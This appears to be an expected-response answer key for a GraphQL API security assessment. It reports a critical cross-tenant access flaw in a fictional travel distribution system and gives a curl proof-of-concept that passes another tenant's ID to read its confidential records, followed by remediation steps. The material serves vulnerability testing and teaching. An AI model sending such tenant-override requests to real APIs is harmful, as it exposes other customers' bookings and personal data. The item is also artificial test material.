# Expected Response

## System
- Domain: Travel / Distribution
- System: SkyPort Global Distribution
- Example ID: GQL-0118

## Priority Findings

### Finding 1: Cross-Tenant Booking Batch Lookup — Client tenantId Enables Mass Travel Data Access (Pattern 1.9)
**Severity:** Critical
**Category:** BOLA / Batch Lookup

**Summary:**
Per §5.0 (Pattern 1.9 — batch/bulk lookup endpoints): The `listResources` endpoint trusts client-supplied `tenantId`, enabling batch enumeration of travel distribution records. An attacker from `tenant-ba43` passed `tenantId: "tenant-ea92"` to enumerate booking/pricing records belonging to another travel agency or GDS participant. This exposes fare data, booking references, traveler PII, and partner pricing structures.

**Evidence from HAR:**
- Request: `POST https://api.skyport-global-dist.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-ba43`
- Query: `listResources(tenantId: "tenant-ea92") { resourceId ownerId data { sensitiveField } }`
- Response `200 OK`; `tenantId: "tenant-ea92"`, `ownerId: "other-user-ba43ea92"`, `sensitiveField: "CONFIDENTIAL-ba43ea92"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-ba43ea92`

## Steps to Reproduce

### Step 1 — Batch travel booking access (HAR)
```bash
curl -s -X POST https://api.skyport-global-dist.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-ba43" \
  -d '{"query": "query VulnerableOp { listResources(tenantId: \"tenant-ea92\") { resourceId ownerId data { sensitiveField } } }"}'
```
**Vulnerable:** Returns `CONFIDENTIAL-ba43ea92` from `tenant-ea92`. **Secure:** FORBIDDEN.

## Remediation
1. `listResources` must use JWT `tenantId` — discard client argument.
2. Resolver tenant guard: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
3. Redis cache key: `resource:{tenantId}:{resourceId}`.
